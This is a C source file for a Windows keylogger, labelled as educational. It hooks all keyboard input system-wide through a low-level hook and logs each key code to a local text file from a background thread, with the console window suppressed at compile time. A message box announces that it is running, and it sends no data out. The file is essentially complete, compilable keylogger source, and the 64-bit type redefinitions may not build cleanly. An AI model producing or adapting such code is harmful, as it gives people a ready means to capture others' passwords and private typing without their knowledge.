/*
 * Educational Purpose Keylogger Only
 * This code is intended for educational purposes only.
 * Do not use it for malicious activities.
 * 
 * Compile :
 *     gcc keyLogger.c -o keylogger.exe -mwindows
 */


#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

static HHOOK hook = NULL;
static FILE *log_file = NULL;


#if defined(_WIN64)
    typedef long long INT_PTR;
    typedef unsigned long long UINT_PTR;
#else
    // typedef long INT_PTR;
    // typedef unsigned long UINT_PTR; 
#endif


typedef INT_PTR  LRESULT_EX;
typedef UINT_PTR WPARAM_EX;
typedef INT_PTR  LPARAM_EX;


// Keyboard Hook Procedure
LRESULT_EX __stdcall KeyboardProc(int nCode, WPARAM_EX wParam, LPARAM_EX lParam) {
    if (nCode == HC_ACTION && (wParam == (WPARAM_EX)WM_KEYDOWN || wParam == (WPARAM_EX)WM_SYSKEYDOWN)) {
        const KBDLLHOOKSTRUCT *p = (const KBDLLHOOKSTRUCT * )(INT_PTR)lParam;
        DWORD vkCode = p->vkCode;

        if(log_file){
            fprintf(log_file, "VK: 0x%02lX (%lu)\n", vkCode, vkCode); // hex and decimal representation
            fflush(log_file);
        }
    }

    // Propagate the hook to the next hook procedure in the current hook chain
    return CallNextHookEx(hook, nCode, (WPARAM)wParam, (LPARAM)lParam);
}



// Record Thread
DWORD __stdcall LoggerThread(void *unused){
    HINSTANCE hInstance = GetModuleHandle(NULL);
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, hInstance, 0);

    if(!hook){
        MessageBox(NULL, "SetWindowsHookEx failed!", "Error", MB_ICONERROR);
        return 1;
    }

    MSG msg;
    // Message loop to keep the hook active, local context thread
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    return 0;
}



int main() {
    
    // Open a file to log the keys
    log_file = fopen("keylog.txt", "a");
    if(!log_file){
        MessageBox(NULL, "Could not open log file", "Error", MB_ICONERROR);
        return 1;
    }

    // Thread logger
    DWORD thread_id;
    HANDLE thread = CreateThread(NULL, 0, LoggerThread, NULL, 0, &thread_id);
    if(!thread) {
        MessageBox(NULL, "CreateThread failed", "Error", MB_ICONERROR);
        fclose(log_file);
        return 1;
    }

    MessageBox(NULL, "Keylogger running.\nClick OK to stop.", "Keylogger", MB_OK | MB_ICONINFORMATION);

    // Quit, Loop GetMessage stops via PostQuitMessage
    PostThreadMessage(thread_id, WM_QUIT, 0, 0);

    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);


    fclose(log_file);
    return 0;
}
